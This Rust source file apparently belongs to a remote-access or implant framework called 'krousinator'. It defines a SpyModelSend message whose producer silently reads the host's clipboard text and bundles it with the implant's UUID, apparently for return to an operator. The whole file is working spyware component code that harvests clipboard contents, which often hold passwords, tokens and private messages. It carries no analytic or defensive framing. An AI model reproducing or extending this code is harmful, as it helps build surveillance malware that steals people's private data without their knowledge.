use serde::{Serialize, Deserialize};
use common::registry::producer::Producer;
use arboard::Clipboard;
use common::registry::krousinator_interface::KrousinatorInterface;
use uuid::Uuid;

#[derive(Debug, Serialize, Deserialize)]
pub struct SpyModelSend {
    _t:  &'static str,
    uuid: Uuid,
    clipboard: String
}

impl Producer for SpyModelSend {
    fn produce(krousinator_instance_data: &KrousinatorInterface) -> Self {
        let mut clipboard = Clipboard::new().unwrap();
        let text = clipboard.get_text().unwrap();
        Self { _t: "SpyModelSend", uuid: krousinator_instance_data.get_uuid(), clipboard: text}
        
    }
}

